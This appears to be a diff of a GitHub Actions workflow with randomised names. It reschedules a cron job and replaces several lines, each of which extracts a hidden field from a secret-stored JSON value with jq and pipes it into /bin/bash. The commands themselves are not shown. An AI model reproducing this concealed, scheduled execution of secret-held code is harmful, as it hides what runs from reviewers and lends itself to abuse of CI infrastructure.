@@ -3,28 +3,21 @@ name: yutaishan3484
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 4/6 * * *'
-
-jobs:  # 20670
+    - cron: '19 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yutaishan3484
         env:
-          c3052: ${{ secrets.c3052 }}
+          kzgg58: ${{ secrets.kzgg58 }}
         run: |
-          echo $c3052 | jq -r .e8226 | /bin/bash
-          echo $b8 | jq -r .ubqnk02229 | /bin/bash
-          echo $b58312 | jq -r .hz1 | /bin/bash
-          echo $te0 | jq -r .wwj510 | /bin/bash
-          echo $rbgoy82827 | jq -r .z2340 | /bin/bash
-          echo $pgf879 | jq -r .rlvz29 | /bin/bash
-          echo $kl63447 | jq -r .ewi47597 | /bin/bash
-          echo $z36133 | jq -r .vlhbj88510 | /bin/bash
-          echo $acnb79 | jq -r .jynb8 | /bin/bash
-          echo $xd6725 | jq -r .ry865 | /bin/bash
-          echo $uyzu3717 | jq -r .dcoyj609 | /bin/bash
-          echo $yue4 | jq -r .yq6 | /bin/bash
-          echo $zgtmp516 | jq -r .qh97 | /bin/bash
+          echo $kzgg58 | jq -r .fsih1308 | /bin/bash
+          echo $oentm1257 | jq -r .azj2994 | /bin/bash
+          echo $u5 | jq -r .oemk1320 | /bin/bash
+          echo $qix115 | jq -r .h80 | /bin/bash
+          echo $czy47783 | jq -r .s9 | /bin/bash
+          echo $sbd22873 | jq -r .hjjc05404 | /bin/bash
 
